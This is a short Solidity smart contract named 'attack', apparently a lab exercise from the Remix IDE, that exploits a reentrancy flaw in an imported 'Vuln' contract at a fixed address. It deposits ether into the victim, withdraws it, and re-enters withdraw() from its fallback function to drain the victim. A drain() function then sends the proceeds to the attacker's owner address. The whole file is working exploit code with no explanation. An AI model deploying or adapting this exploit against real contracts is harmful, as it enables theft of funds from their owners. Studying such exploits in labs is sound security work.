pragma solidity ^0.5.0;
import 'browser/vuln.sol';
contract attack {
    Vuln vuln = Vuln(address(0xFB81aDf526904E3E71ca7C0d2dc841a94B1E203C));
    address payable owner;
    
    constructor() public{
        owner = msg.sender;
    }
    
    function () payable external{
        if (address(this).balance < 1 ether){
            vuln.withdraw();
        }
    }
    
    function deposit() payable public{
        vuln.deposit.value(msg.value)();
        vuln.withdraw();
    }
    
    function drain() public{
        
        owner.transfer(address(this).balance);
    }
}